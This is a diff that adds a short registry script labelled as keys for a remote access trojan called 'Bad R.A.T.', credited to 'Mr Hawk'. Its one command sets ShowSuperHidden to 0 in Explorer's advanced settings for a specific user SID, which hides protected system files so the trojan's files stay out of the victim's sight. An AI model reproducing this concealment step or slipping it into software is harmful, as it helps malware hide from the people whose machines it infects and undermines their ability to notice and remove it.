@@ -1,0 +1,5 @@
+;Reg Keys for [Bad R.A.T.]
+;by Mr Hawk
+;www.bad-rat.de.vu
+;Hidden Systemfile 
+RegAdd HKEY_CURRENT_USER,S-1-5-21-527237240-492894223-839522115-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced,ShowSuperHidden,0
